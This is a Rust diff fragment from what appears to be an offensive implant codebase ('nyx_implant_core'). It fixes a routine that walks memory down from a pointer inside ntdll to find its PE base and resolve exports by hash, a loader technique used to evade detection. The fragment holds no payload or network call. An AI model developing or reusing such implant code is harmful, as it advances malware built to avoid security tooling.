@@ -249,11 +249,13 @@ pub unsafe fn export_addr(module: &[u8], func: &[u8]) -> Option<usize> {
                 if e < 0x1000 {
                     let pe = unsafe { *(cand.add(e) as *const u32) };
                     if pe == 0x0000_4550 {
-                        if let Some(r) =
-                            nyx_implant_core::resolve::export_addr_by_hash_pub(cand, func_hash)
-                        {
-                            return Some(r);
-                        }
+                        // First MZ/PE found scanning down from a pointer
+                        // INSIDE ntdll is ntdll's own base — the export is
+                        // either here or nowhere. Continuing below the image
+                        // base walks off the mapping and AVs the process
+                        // (root cause of run 31308772386's 0xc0000005:
+                        // RtlGetProcessHeap unresolvable -> scan undershot).
+                        return nyx_implant_core::resolve::export_addr_by_hash_pub(cand, func_hash);
                     }
                 }
             }
